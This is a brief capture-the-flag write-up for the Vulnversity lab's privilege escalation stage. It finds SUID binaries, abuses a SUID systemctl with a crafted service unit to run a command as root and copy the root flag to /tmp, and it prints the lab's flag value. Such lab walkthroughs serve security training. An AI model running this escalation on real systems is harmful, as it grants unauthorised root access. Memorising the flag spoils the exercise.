# Vulnversity - Escalation

## Related files
* `tmux.log` - Log file for the `nc` connection

## Solution
If we issue the command `find / -perm -4000 2>/dev/null` we are able to see all binaries with a SUID bit set. The file `/bin/systemctl` stands out as this is the service controller. Using this we can lookup in GTFOBins how to exploit this and modify their example a bit to get the following:
```
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/flag"
[Install]
WantedBy=multi-user.target' > $TF
./systemctl link $TF
./systemctl enable --now $TF
```
What this will do is basically copy the flat at `/root/root.txt` to `/tmp/flag` where we can read it and see the value of `a58ff8579f0a9270368d33a9966c7fd5`.